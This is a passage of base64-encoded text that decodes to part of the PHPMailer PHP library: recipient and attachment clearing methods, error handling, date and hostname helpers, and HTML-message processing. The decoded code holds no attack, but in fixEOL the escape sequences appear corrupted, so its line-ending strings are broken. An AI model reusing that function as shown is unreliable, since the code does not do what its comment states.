AgIH0KICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgLyoqCiAgICAgKiBDaGVjayBpZiB0aGlzIG1lc3NhZ2UgaGFzIGFuIGFsdGVybmF0aXZlIGJvZHkgc2V0LgogICAgICogQHJldHVybiBib29sZWFuCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBhbHRlcm5hdGl2ZUV4aXN0cygpCiAgICB7CiAgICAgICAgcmV0dXJuICFlbXB0eSgkdGhpcy0+QWx0Qm9keSk7CiAgICB9CgogICAgLyoqCiAgICAgKiBDbGVhciBxdWV1ZWQgYWRkcmVzc2VzIG9mIGdpdmVuIGtpbmQuCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICogQHBhcmFtIHN0cmluZyAka2luZCAndG8nLCAnY2MnLCBvciAnYmNjJwogICAgICogQHJldHVybiB2b2lkCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBjbGVhclF1ZXVlZEFkZHJlc3Nlcygka2luZCkKICAgIHsKICAgICAgICAkUmVjaXBpZW50c1F1ZXVlID0gJHRoaXMtPlJlY2lwaWVudHNRdWV1ZTsKICAgICAgICBmb3JlYWNoICgkUmVjaXBpZW50c1F1ZXVlIGFzICRhZGRyZXNzID0+ICRwYXJhbXMpIHsKICAgICAgICAgICAgaWYgKCRwYXJhbXNbMF0gPT0gJGtpbmQpIHsKICAgICAgICAgICAgICAgIHVuc2V0KCR0aGlzLT5SZWNpcGllbnRzUXVldWVbJGFkZHJlc3NdKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICAvKioKICAgICAqIENsZWFyIGFsbCBUbyByZWNpcGllbnRzLgogICAgICogQHJldHVybiB2b2lkCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBjbGVhckFkZHJlc3NlcygpCiAgICB7CiAgICAgICAgZm9yZWFjaCAoJHRoaXMtPnRvIGFzICR0bykgewogICAgICAgICAgICB1bnNldCgkdGhpcy0+YWxsX3JlY2lwaWVudHNbc3RydG9sb3dlcigkdG9bMF0pXSk7CiAgICAgICAgfQogICAgICAgICR0aGlzLT50byA9IGFycmF5KCk7CiAgICAgICAgJHRoaXMtPmNsZWFyUXVldWVkQWRkcmVzc2VzKCd0bycpOwogICAgfQoKICAgIC8qKgogICAgICogQ2xlYXIgYWxsIENDIHJlY2lwaWVudHMuCiAgICAgKiBAcmV0dXJuIHZvaWQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyQ0NzKCkKICAgIHsKICAgICAgICBmb3JlYWNoICgkdGhpcy0+Y2MgYXMgJGNjKSB7CiAgICAgICAgICAgIHVuc2V0KCR0aGlzLT5hbGxfcmVjaXBpZW50c1tzdHJ0b2xvd2VyKCRjY1swXSldKTsKICAgICAgICB9CiAgICAgICAgJHRoaXMtPmNjID0gYXJyYXkoKTsKICAgICAgICAkdGhpcy0+Y2xlYXJRdWV1ZWRBZGRyZXNzZXMoJ2NjJyk7CiAgICB9CgogICAgLyoqCiAgICAgKiBDbGVhciBhbGwgQkNDIHJlY2lwaWVudHMuCiAgICAgKiBAcmV0dXJuIHZvaWQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyQkNDcygpCiAgICB7CiAgICAgICAgZm9yZWFjaCAoJHRoaXMtPmJjYyBhcyAkYmNjKSB7CiAgICAgICAgICAgIHVuc2V0KCR0aGlzLT5hbGxfcmVjaXBpZW50c1tzdHJ0b2xvd2VyKCRiY2NbMF0pXSk7CiAgICAgICAgfQogICAgICAgICR0aGlzLT5iY2MgPSBhcnJheSgpOwogICAgICAgICR0aGlzLT5jbGVhclF1ZXVlZEFkZHJlc3NlcygnYmNjJyk7CiAgICB9CgogICAgLyoqCiAgICAgKiBDbGVhciBhbGwgUmVwbHlUbyByZWNpcGllbnRzLgogICAgICogQHJldHVybiB2b2lkCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBjbGVhclJlcGx5VG9zKCkKICAgIHsKICAgICAgICAkdGhpcy0+UmVwbHlUbyA9IGFycmF5KCk7CiAgICAgICAgJHRoaXMtPlJlcGx5VG9RdWV1ZSA9IGFycmF5KCk7CiAgICB9CgogICAgLyoqCiAgICAgKiBDbGVhciBhbGwgcmVjaXBpZW50IHR5cGVzLgogICAgICogQHJldHVybiB2b2lkCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBjbGVhckFsbFJlY2lwaWVudHMoKQogICAgewogICAgICAgICR0aGlzLT50byA9IGFycmF5KCk7CiAgICAgICAgJHRoaXMtPmNjID0gYXJyYXkoKTsKICAgICAgICAkdGhpcy0+YmNjID0gYXJyYXkoKTsKICAgICAgICAkdGhpcy0+YWxsX3JlY2lwaWVudHMgPSBhcnJheSgpOwogICAgICAgICR0aGlzLT5SZWNpcGllbnRzUXVldWUgPSBhcnJheSgpOwogICAgfQoKICAgIC8qKgogICAgICogQ2xlYXIgYWxsIGZpbGVzeXN0ZW0sIHN0cmluZywgYW5kIGJpbmFyeSBhdHRhY2htZW50cy4KICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xlYXJBdHRhY2htZW50cygpCiAgICB7CiAgICAgICAgJHRoaXMtPmF0dGFjaG1lbnQgPSBhcnJheSgpOwogICAgfQoKICAgIC8qKgogICAgICogQ2xlYXIgYWxsIGN1c3RvbSBoZWFkZXJzLgogICAgICogQHJldHVybiB2b2lkCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBjbGVhckN1c3RvbUhlYWRlcnMoKQogICAgewogICAgICAgICR0aGlzLT5DdXN0b21IZWFkZXIgPSBhcnJheSgpOwogICAgfQoKICAgIC8qKgogICAgICogQWRkIGFuIGVycm9yIG1lc3NhZ2UgdG8gdGhlIGVycm9yIGNvbnRhaW5lci4KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKiBAcGFyYW0gc3RyaW5nICRtc2cKICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gc2V0RXJyb3IoJG1zZykKICAgIHsKICAgICAgICAkdGhpcy0+ZXJyb3JfY291bnQrKzsKICAgICAgICBpZiAoJHRoaXMtPk1haWxlciA9PSAnc210cCcgYW5kICFpc19udWxsKCR0aGlzLT5zbXRwKSkgewogICAgICAgICAgICAkbGFzdGVycm9yID0gJHRoaXMtPnNtdHAtPmdldEVycm9yKCk7CiAgICAgICAgICAgIGlmICghZW1wdHkoJGxhc3RlcnJvclsnZXJyb3InXSkpIHsKICAgICAgICAgICAgICAgICRtc2cgLj0gJHRoaXMtPmxhbmcoJ3NtdHBfZXJyb3InKSAuICRsYXN0ZXJyb3JbJ2Vycm9yJ107CiAgICAgICAgICAgICAgICBpZiAoIWVtcHR5KCRsYXN0ZXJyb3JbJ2RldGFpbCddKSkgewogICAgICAgICAgICAgICAgICAgICRtc2cgLj0gJyBEZXRhaWw6ICcuICRsYXN0ZXJyb3JbJ2RldGFpbCddOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCFlbXB0eSgkbGFzdGVycm9yWydzbXRwX2NvZGUnXSkpIHsKICAgICAgICAgICAgICAgICAgICAkbXNnIC49ICcgU01UUCBjb2RlOiAnIC4gJGxhc3RlcnJvclsnc210cF9jb2RlJ107CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoIWVtcHR5KCRsYXN0ZXJyb3JbJ3NtdHBfY29kZV9leCddKSkgewogICAgICAgICAgICAgICAgICAgICRtc2cgLj0gJyBBZGRpdGlvbmFsIFNNVFAgaW5mbzogJyAuICRsYXN0ZXJyb3JbJ3NtdHBfY29kZV9leCddOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICR0aGlzLT5FcnJvckluZm8gPSAkbXNnOwogICAgfQoKICAgIC8qKgogICAgICogUmV0dXJuIGFuIFJGQyA4MjIgZm9ybWF0dGVkIGRhdGUuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqIEBzdGF0aWMKICAgICAqLwogICAgcHVibGljIHN0YXRpYyBmdW5jdGlvbiByZmNEYXRlKCkKICAgIHsKICAgICAgICAvLyBTZXQgdGhlIHRpbWUgem9uZSB0byB3aGF0ZXZlciB0aGUgZGVmYXVsdCBpcyB0byBhdm9pZCA1MDAgZXJyb3JzCiAgICAgICAgLy8gV2lsbCBkZWZhdWx0IHRvIFVUQyBpZiBpdCdzIG5vdCBzZXQgcHJvcGVybHkgaW4gcGhwLmluaQogICAgICAgIGRhdGVfZGVmYXVsdF90aW1lem9uZV9zZXQoQGRhdGVfZGVmYXVsdF90aW1lem9uZV9nZXQoKSk7CiAgICAgICAgcmV0dXJuIGRhdGUoJ0QsIGogTSBZIEg6aTpzIE8nKTsKICAgIH0KCiAgICAvKioKICAgICAqIEdldCB0aGUgc2VydmVyIGhvc3RuYW1lLgogICAgICogUmV0dXJucyAnbG9jYWxob3N0LmxvY2FsZG9tYWluJyBpZiB1bmtub3duLgogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBzZXJ2ZXJIb3N0bmFtZSgpCiAgICB7CiAgICAgICAgJHJlc3VsdCA9ICdsb2NhbGhvc3QubG9jYWxkb21haW4nOwogICAgICAgIGlmICghZW1wdHkoJHRoaXMtPkhvc3RuYW1lKSkgewogICAgICAgICAgICAkcmVzdWx0ID0gJHRoaXMtPkhvc3RuYW1lOwogICAgICAgIH0gZWxzZWlmIChpc3NldCgkX1NFUlZFUikgYW5kIGFycmF5X2tleV9leGlzdHMoJ1NFUlZFUl9OQU1FJywgJF9TRVJWRVIpIGFuZCAhZW1wdHkoJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10pKSB7CiAgICAgICAgICAgICRyZXN1bHQgPSAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXTsKICAgICAgICB9IGVsc2VpZiAoZnVuY3Rpb25fZXhpc3RzKCdnZXRob3N0bmFtZScpICYmIGdldGhvc3RuYW1lKCkgIT09IGZhbHNlKSB7CiAgICAgICAgICAgICRyZXN1bHQgPSBnZXRob3N0bmFtZSgpOwogICAgICAgIH0gZWxzZWlmIChwaHBfdW5hbWUoJ24nKSAhPT0gZmFsc2UpIHsKICAgICAgICAgICAgJHJlc3VsdCA9IHBocF91bmFtZSgnbicpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJHJlc3VsdDsKICAgIH0KCiAgICAvKioKICAgICAqIEdldCBhbiBlcnJvciBtZXNzYWdlIGluIHRoZSBjdXJyZW50IGxhbmd1YWdlLgogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqIEBwYXJhbSBzdHJpbmcgJGtleQogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGxhbmcoJGtleSkKICAgIHsKICAgICAgICBpZiAoY291bnQoJHRoaXMtPmxhbmd1YWdlKSA8IDEpIHsKICAgICAgICAgICAgJHRoaXMtPnNldExhbmd1YWdlKCdlbicpOyAvLyBzZXQgdGhlIGRlZmF1bHQgbGFuZ3VhZ2UKICAgICAgICB9CgogICAgICAgIGlmIChhcnJheV9rZXlfZXhpc3RzKCRrZXksICR0aGlzLT5sYW5ndWFnZSkpIHsKICAgICAgICAgICAgaWYgKCRrZXkgPT0gJ3NtdHBfY29ubmVjdF9mYWlsZWQnKSB7CiAgICAgICAgICAgICAgICAvL0luY2x1ZGUgYSBsaW5rIHRvIHRyb3VibGVzaG9vdGluZyBkb2NzIG9uIFNNVFAgY29ubmVjdGlvbiBmYWlsdXJlCiAgICAgICAgICAgICAgICAvL3RoaXMgaXMgYnkgZmFyIHRoZSBiaWdnZXN0IGNhdXNlIG9mIHN1cHBvcnQgcXVlc3Rpb25zCiAgICAgICAgICAgICAgICAvL2J1dCBpdCdzIHVzdWFsbHkgbm90IFBIUE1haWxlcidzIGZhdWx0LgogICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5sYW5ndWFnZVska2V5XSAuICcgaHR0cHM6Ly9naXRodWIuY29tL1BIUE1haWxlci9QSFBNYWlsZXIvd2lraS9Ucm91Ymxlc2hvb3RpbmcnOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiAkdGhpcy0+bGFuZ3VhZ2VbJGtleV07CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgLy9SZXR1cm4gdGhlIGtleSBhcyBhIGZhbGxiYWNrCiAgICAgICAgICAgIHJldHVybiAka2V5OwogICAgICAgIH0KICAgIH0KCiAgICAvKioKICAgICAqIENoZWNrIGlmIGFuIGVycm9yIG9jY3VycmVkLgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEByZXR1cm4gYm9vbGVhbiBUcnVlIGlmIGFuIGVycm9yIGRpZCBvY2N1ci4KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGlzRXJyb3IoKQogICAgewogICAgICAgIHJldHVybiAoJHRoaXMtPmVycm9yX2NvdW50ID4gMCk7CiAgICB9CgogICAgLyoqCiAgICAgKiBFbnN1cmUgY29uc2lzdGVudCBsaW5lIGVuZGluZ3MgaW4gYSBzdHJpbmcuCiAgICAgKiBDaGFuZ2VzIGV2ZXJ5IGVuZCBvZiBsaW5lIGZyb20gQ1JMRiwgQ1Igb3IgTEYgdG8gJHRoaXMtPkxFLgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0ciBTdHJpbmcgdG8gZml4RU9MCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZml4RU9MKCRzdHIpCiAgICB7CiAgICAgICAgLy8gTm9ybWFsaXNlIHRvIAoKICAgICAgICAkbnN0ciA9IHN0cl9yZXBsYWNlKGFycmF5KCIKIiwgIgoiKSwgIgoiLCAkc3RyKTsKICAgICAgICAvLyBOb3cgY29udmVydCBMRSBhcyBuZWVkZWQKICAgICAgICBpZiAoJHRoaXMtPkxFICE9PSAiCiIpIHsKICAgICAgICAgICAgJG5zdHIgPSBzdHJfcmVwbGFjZSgiCiIsICR0aGlzLT5MRSwgJG5zdHIpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJG5zdHI7CiAgICB9CgogICAgLyoqCiAgICAgKiBBZGQgYSBjdXN0b20gaGVhZGVyLgogICAgICogJG5hbWUgdmFsdWUgY2FuIGJlIG92ZXJsb2FkZWQgdG8gY29udGFpbgogICAgICogYm90aCBoZWFkZXIgbmFtZSBhbmQgdmFsdWUgKG5hbWU6dmFsdWUpCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZSBDdXN0b20gaGVhZGVyIG5hbWUKICAgICAqIEBwYXJhbSBzdHJpbmcgJHZhbHVlIEhlYWRlciB2YWx1ZQogICAgICogQHJldHVybiB2b2lkCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRDdXN0b21IZWFkZXIoJG5hbWUsICR2YWx1ZSA9IG51bGwpCiAgICB7CiAgICAgICAgaWYgKCR2YWx1ZSA9PT0gbnVsbCkgewogICAgICAgICAgICAvLyBWYWx1ZSBwYXNzZWQgaW4gYXMgbmFtZTp2YWx1ZQogICAgICAgICAgICAkdGhpcy0+Q3VzdG9tSGVhZGVyW10gPSBleHBsb2RlKCc6JywgJG5hbWUsIDIpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICR0aGlzLT5DdXN0b21IZWFkZXJbXSA9IGFycmF5KCRuYW1lLCAkdmFsdWUpOwogICAgICAgIH0KICAgIH0KCiAgICAvKioKICAgICAqIFJldHVybnMgYWxsIGN1c3RvbSBoZWFkZXJzLgogICAgICogQHJldHVybiBhcnJheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0Q3VzdG9tSGVhZGVycygpCiAgICB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5DdXN0b21IZWFkZXI7CiAgICB9CgogICAgLyoqCiAgICAgKiBDcmVhdGUgYSBtZXNzYWdlIGJvZHkgZnJvbSBhbiBIVE1MIHN0cmluZy4KICAgICAqIEF1dG9tYXRpY2FsbHkgaW5saW5lcyBpbWFnZXMgYW5kIGNyZWF0ZXMgYSBwbGFpbi10ZXh0IHZlcnNpb24gYnkgY29udmVydGluZyB0aGUgSFRNTCwKICAgICAqIG92ZXJ3cml0aW5nIGFueSBleGlzdGluZyB2YWx1ZXMgaW4gQm9keSBhbmQgQWx0Qm9keS4KICAgICAqIERvIG5vdCBzb3VyY2UgJG1lc3NhZ2UgY29udGVudCBmcm9tIHVzZXIgaW5wdXQhCiAgICAgKiAkYmFzZWRpciBpcyBwcmVwZW5kZWQgd2hlbiBoYW5kbGluZyByZWxhdGl2ZSBVUkxzLCBlLmcuIDxpbWcgc3JjPSIvaW1hZ2VzL2EucG5nIj4gYW5kIG11c3Qgbm90IGJlIGVtcHR5CiAgICAgKiB3aWxsIGxvb2sgZm9yIGFuIGltYWdlIGZpbGUgaW4gJGJhc2VkaXIvaW1hZ2VzL2EucG5nIGFuZCBjb252ZXJ0IGl0IHRvIGlubGluZS4KICAgICAqIElmIHlvdSBkb24ndCBwcm92aWRlIGEgJGJhc2VkaXIsIHJlbGF0aXZlIHBhdGhzIHdpbGwgYmUgbGVmdCB1bnRvdWNoZWQgKGFuZCB0aHVzIHByb2JhYmx5IGJyZWFrIGluIGVtYWlsKQogICAgICogSWYgeW91IGRvbid0IHdhbnQgdG8gYXBwbHkgdGhlc2UgdHJhbnNmb3JtYXRpb25zIHRvIHlvdXIgSFRNTCwganVzdCBzZXQgQm9keSBhbmQgQWx0Qm9keSBkaXJlY3RseS4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcGFyYW0gc3RyaW5nICRtZXNzYWdlIEhUTUwgbWVzc2FnZSBzdHJpbmcKICAgICAqIEBwYXJhbSBzdHJpbmcgJGJhc2VkaXIgQWJzb2x1dGUgcGF0aCB0byBhIGJhc2UgZGlyZWN0b3J5IHRvIHByZXBlbmQgdG8gcmVsYXRpdmUgcGF0aHMgdG8gaW1hZ2VzCiAgICAgKiBAcGFyYW0gYm9vbGVhbnxjYWxsYWJsZSAkYWR2YW5jZWQgV2hldGhlciB0byB1c2UgdGhlIGludGVybmFsIEhUTUwgdG8gdGV4dCBjb252ZXJ0ZXIKICAgICAqICAgIG9yIHlvdXIgb3duIGN1c3RvbSBjb252ZXJ0ZXIgQHNlZSBQSFBNYWlsZXI6Omh0bWwydGV4dCgpCiAgICAgKiBAcmV0dXJuIHN0cmluZyAkbWVzc2FnZSBUaGUgdHJhbnNmb3JtZWQgbWVzc2FnZSBCb2R5CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBtc2dIVE1MKCRtZXNzYWdlLCAkYmFzZWRpciA9ICcnLCAkYWR2YW5jZWQgPSBmYWxzZSkKICAgIHsKICAgICAgICBwcmVnX21hdGNoX2FsbCgnLyhzcmN8YmFja2dyb3VuZCk9WyJcJ10oLiopWyJcJ10vVWknLCAkbWVzc2FnZSwgJGltYWdlcyk7CiAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoMiwgJGltYWdlcykpIHsKICAgICAgICAgICAgaWYgKHN0cmxlbigkYmFzZWRpcikgPiAxICYmIHN1YnN0cigkYmFzZWRpciwgLTEpICE9ICcvJykgewogICAgICAgICAgICAgICAgLy8gRW5zdXJlICRiYXNlZGlyIGhhcyBhIHRyYWlsaW5nIC8KICAgICAgICAgICAgICAgICRiYXNlZGlyIC49ICcvJzsKICAgICAgICAgICAgfQogICAgICAgICAgICBmb3JlYWNoICgkaW1hZ2VzWzJdIGFzICRpbWdpbmRleCA9PiAkdXJsKSB7CiAgICAgICAgICAgICAgICAvLyBDb252ZXJ0IGRhdGEgVVJJcyBpbnRvIGVtYmVkZGVkIGltYWdlcwogICAgICAgICAgICAgICAgaWYgKHByZWdfbWF0Y2goJyNeZGF0YTooaW1hZ2VbXjssXSopKDtiYXNlNjQpPywjJywgJHVybCwgJG1hdGNoKSkgewogICAgICAgICAgICAgICAgICAgICRkYXRhID0gc3Vic3RyKCR1cmwsIHN0cnBvcygkdXJsLCAnLCcpKTsKICAgICAgICAgICAgICAgICAgICBpZiAoJG1hdGNoWzJdKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRkYXRhID0gYmFzZTY0X2RlY29kZSgkZGF0YSk7CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGRhdGEgPSByYXd1cmxkZWNvZGUoJGRhdGEpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkY2lkID0gbWQ1KCR1cmwpIC4gJ0BwaHBtYWlsZXIuMCc7IC8vIFJGQzIzOTIgUyAyCiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5hZGRTdHJpbmdFbWJlZGRlZEltYWdlKCRkYXRhLCAkY2lkLCAnZW1iZWQnIC4gJGltZ2luZGV4LCAnYmFzZTY0JywgJG1hdGNoWzFdKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkbWVzc2FnZSA9IHN0cl9yZXBsYWNlKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGltYWdlc1swXVskaW1naW5kZXhdLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGltYWdlc1sxXVskaW1naW5kZXhdIC4gJz0iY2lkOicgLiAkY2lkIC4gJyInLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UKICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoCiAgICAgICAgICAgICAgICAgICAgLy8gT25seSBwcm9jZXNzIHJlbGF0aXZlIFVSTHMgaWYgYSBiYXNlZGlyIGlzIHByb3ZpZGVkIChpLmUuIG5vIGFic29sdXRlIGxvY2FsIHBhdGhzKQogICAgICAgICAgICAgICAgICAgICFlbXB0eSgkYmFzZWRpcikKICAgICAgICAgICAgICAgICAgICAvLyBJZ25vcmUgVVJMcyBjb250YWluaW5nIHBhcmVudCBkaXIgdHJhdmVyc2FsICguLikKICAgICAgICAgICAgICAgICAgICAmJiAoc3RycG9zKCR1cmwsICcuLicpID09PSBmYWxzZSkKICAgICAgICAgICAgICAgICAgICAvLyBEbyBub3QgY2hhbmdlIHVybHMgdGhhdCBhcmUgYWxyZWFkeSBpbmxpbmUgaW1hZ2VzCiAgICAgICAgICAgICAgICAgICAgJiYgc3Vic3RyKCR1cmwsIDAsIDQpICE9PSAnY2lkOicKICAgICAgICAgICAgICAgICAgICAvLyBEbyBub3QgY2hhbmdlIGFic29sdXRlIFVSTHMsIGluY2x1ZGluZyBhbm9ueW1vdXMgcHJvdG9jb2wKICAgICAgICAgICAgICAgICAgICAmJiAhcHJlZ19tYXRjaCgnI15bYS16XVthLXowLTkrLi1dKjo/Ly8jaScsICR1cmwpCiAgICAgICAgICAgICAgICApIHsKICAgICAgICAgICAgICAgICAgICAkZmlsZW5hbWUgPSBiYXNlbmFtZSgkdXJsKTsKICAgICAgICAgICAgICAgICAgICAkZGlyZWN0b3J5ID0gZGlybmFtZSgkdXJsKTsKICAgICAgICAgICAgICAgICAgICBpZiAoJGRpcmVjdG9yeSA9PSAnLicpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGRpcmVjdG9yeSA9ICcnOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkY2lkID0gbWQ1KCR1cmwpIC4gJ0BwaHBtYWlsZXIuMCc7IC8vIFJGQzIzOTIgUyAyCiAgICAgICAgICAgICAgICAgICAgaWYgKHN0cmxlbigkZGlyZWN0b3J5KSA+IDEgJiYgc3Vic3RyKCRkaXJlY3RvcnksIC0xKSAhPSAnLycpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGRpcmVjdG9yeSAuPSAnLyc7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+YWRkRW1iZWRkZWRJbWFnZSgKICAgICAgICAgICAgICAgICAgICAgICAgJGJhc2VkaXIgLiAkZGlyZWN0b3J5IC4gJGZpbGVuYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAkY2lkLAogICAgICAgICAgICAgICAgICAgICAgICAkZmlsZW5hbWUsCiAgICAgICAgICAgICAgICAgICAgICAgICdiYXNlNjQnLAogICAgICAgICAgICAgICAgICAgICAgICBzZWxmOjpfbWltZV90eXBlcygoc3RyaW5nKXNlbGY6Om1iX3BhdGhpbmZvKCRmaWxlbmFtZSwgUEFUSElORk9fRVhURU5TSU9OKSkKICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlID0gcHJlZ19yZXBsYWNlKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJy8nIC4gJGltYWdlc1sxXVskaW1naW5kZXhdIC4gJz1bIlwnXScgLiBwcmVnX3F1b3RlKCR1cmwsICcvJykgLiAnWyJcJ10vVWknLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGltYWdlc1sxXVskaW1naW5kZXhdIC4gJz0iY2lkOicgLiAkY2lkIC4gJyInLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UKICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJHRoaXMtPmlzSFRNTCh0cnVlKTsKICAgICAgICAvLyBDb252ZXJ0IGFsbCBtZXNzYWdlIGJvZHkgbGluZSBicmVha3MgdG8gQ1JMRiwgbWFrZXMgcXVvdGVkLXByaW50YWJsZSBlbmNvZGluZyB3b3JrIG11Y2ggYmV0dGVyCiAgICAgICAgJHRoaXMtPkJvZHkgPSAkdGhpcy0+bm9ybWFsaXplQnJlYWtzKCRtZXNzYWdlKTsKICAgICAgICAkdGhpcy0+QWx0Qm9keSA9ICR0aGlzLT5ub3JtYWxpemVCcmVha3MoJHRoaXMtPmh0bWwydGV4dCgkbWVzc2FnZSwgJGFkdmFuY2VkKSk7CiAgICAgICAgaWYgKCEkdGhpcy0+YWx0ZXJuYXRpdmVFeGlzdHMoKSkgewogICAgICAgICAgICAkdGhpcy0+QWx0Qm9keSA9ICdUbyB2aWV3IHRoaXMgZW1haWwgbWVzc2FnZSwgb3BlbiBpdCBpbiBhIHByb2dyYW0gdGhhdCB1bmRlcnN0YW5kcyBIVE1MIScgLgogICAgICAgICAgICAgICAgc2VsZjo6Q1JMRiAuIHNlbGY6OkNSTEY7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkdGhpcy0+Qm9keTsKICAgIH0KCiAgICAvKioKICAgICAqIENvbnZlcnQgYW4gSFRNTCBzdHJpbmcgaW50byBwbGFpbiB0ZXh0LgogICAgICogVGhpcyBpcyB1c2VkIGJ5IG1zZ0hUTUwoKS4KICAgICAqIE5vdGUgLSBvbGRlciB2ZXJzaW9ucyBvZiB0aGlzIGZ1bmN0aW9uIHVzZWQgYSBidW5kbGVkIGFkdmFuY2VkIGNvbnZlcnRlcgogICAgICogd2hpY2ggd2FzIGJlZW4gcmVtb3ZlZCBmb3IgbGljZW5zZSByZWFzb25zIGluICMyMzIuCiAgICAgKiBFeGFtcGxlIHVzYWdlOgogICAgICogPGNvZGU+CiAgICAgKiAvLyBVc2UgZGVmYXVsdCBjb252ZXJzaW9uCiAgICAgKiAkcGxhaW4gPSAkbWFpbC0+aHRtbDJ0ZXh0KCRodG1sKTsKICAgICAqIC8vIFVzZSB5b3VyIG93biBjdXN0b20gY29udmVydGVyCiAgICAgKiAkcGxhaW4gPSAkbWFpbC0+aHRtbDJ0ZXh0KCRodG1sLCBmdW5jdGlvbigkaHRtbCkgewogICAgICogICAgICRjb252ZXJ0ZXIgPSBuZXcgTXlIdG1sMnRleHQoJGh0bWwpOwogICAgICogICAgIHJldHVybiAkY29udmVydGVyLT5nZXRfdGV4dCgpOwogICAgICogfSk7CiAgICAgKiA8L2NvZGU+CiAgICAgKiBAcGFyYW0gc3RyaW5nICRodG1sIFRoZSBIVE1MIHRleHQgdG8gY29udmVydAogICAgICogQHBhcmFtIGJvb2xlYW58Y2FsbGFibGUgJGFkdmFuY2VkIEFueSBib29sZWFuIHZhbHVlIHRvIHVzZSB0aGUgaW50ZXJuYWwgY29udmVydGVyLAogICAgICogICBvciBwcm92aWRlIHlvdXIgb3duIGNhbGxhYmxlIGZvciBjdXN0b20gY29udmVyc2lvbi4KICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBodG1sMnRleHQoJGh0bWwsICRhZHZhbmNlZCA9IGZhbHNlKQogICAgewogICAgICAgIGlmIChpc19jYWxsYWJsZSgkYWR2YW5jZWQpKSB7CiAgICAgICAgICAgIHJldHVybiBjYWxsX3VzZXJfZnVuYygkYWR2YW5jZWQsICRodG1sKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIGh0bWxfZW50aXR5X2RlY29kZSgKICAgICAgICAgICAgdHJpbShzdHJpcF90YWdzKH